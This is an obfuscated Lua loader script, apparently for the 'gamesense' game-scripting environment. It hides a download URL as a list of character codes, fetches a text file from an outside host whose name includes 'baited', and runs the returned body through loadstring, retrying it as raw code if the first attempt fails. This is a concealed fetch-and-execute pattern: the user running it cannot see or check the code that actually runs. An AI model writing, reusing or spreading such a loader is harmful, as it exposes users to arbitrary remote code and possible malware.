(function()
    local _______________________________________ = loadstring or load
    local _______________________________________________________ = require("gamesense/http")
    
    local _____________________________________________ = {
        [1] = 104, [2] = 116, [3] = 116, [4] = 112, [5] = 115, 
        [6] = 58, [7] = 47, [8] = 47, [9] = 111, [10] = 98, 
        [11] = 97, [12] = 97, [13] = 109, [14] = 97, [15] = 46, 
        [16] = 102, [17] = 119, [18] = 104, [19] = 46, [20] = 105, 
        [21] = 115, [22] = 47, [23] = 97, [24] = 115, [25] = 115, 
        [26] = 101, [27] = 116, [28] = 115, [29] = 47, [30] = 98, 
        [31] = 97, [32] = 105, [33] = 116, [34] = 101, [35] = 100, 
        [36] = 95, [37] = 97, [38] = 105, [39] = 112, [40] = 101, 
        [41] = 101, [42] = 107, [43] = 46, [44] = 116, [45] = 120, 
        [46] = 116
    }
    
    local __________________________________ = ""
    for __________________________ = 1, #_____________________________________________ do
        __________________________________ = __________________________________ .. string.char(_____________________________________________[__________________________])
    end
    
    print("[DEBUG Script 2] URL: " .. __________________________________)
    print("[DEBUG Script 2] Starting download...")
    
    local function ____________________________________________________________________(success, response)
        print("[DEBUG Script 2] Callback executed")
        print("[DEBUG Script 2] Success: " .. tostring(success))
        print("[DEBUG Script 2] Response type: " .. type(response))
        
        if success and type(response) == "table" then
            print("[DEBUG Script 2] Response body length: " .. tostring(response.body and #response.body or "nil"))
            print("[DEBUG Script 2] Response status: " .. tostring(response.status))
            
            if response.body and type(response.body) == "string" and #response.body > 50 then
                print("[DEBUG Script 2] Loading script 1...")
                local ____________________________________________________________, _____________________________________________________________ = pcall(_______________________________________, response.body)
                print("[DEBUG Script 2] Loadstring success: " .. tostring(____________________________________________________________))
                print("[DEBUG Script 2] Result type: " .. type(_____________________________________________________________))
                
                if ____________________________________________________________ then
                    if type(_____________________________________________________________) == "function" then
                        print("[DEBUG Script 2] Executing script 1 function...")
                        _____________________________________________________________()
                        print("[DEBUG Script 2] Script 1 executed")
                    else
                        print("[DEBUG Script 2] ERROR: Result is not a function")
                        print("[DEBUG Script 2] Trying to execute as raw code...")
                        local ______________ = loadstring or load
                        local ___________, _____________________ = pcall(______________, response.body)
                        if ___________ then
                            print("[DEBUG Script 2] Raw code execution success")
                        else
                            print("[DEBUG Script 2] Raw code execution failed: " .. tostring(_____________________))
                        end
                    end
                else
                    print("[DEBUG Script 2] ERROR: " .. tostring(_____________________________________________________________))
                end
            else
                print("[DEBUG Script 2] ERROR: Invalid response body")
            end
        else
            print("[DEBUG Script 2] ERROR: Request failed")
        end
    end
    
    print("[DEBUG Script 2] Making HTTP request...")
    _______________________________________________________.get(__________________________________, ____________________________________________________________________)
    print("[DEBUG Script 2] HTTP request sent")
    
end)()
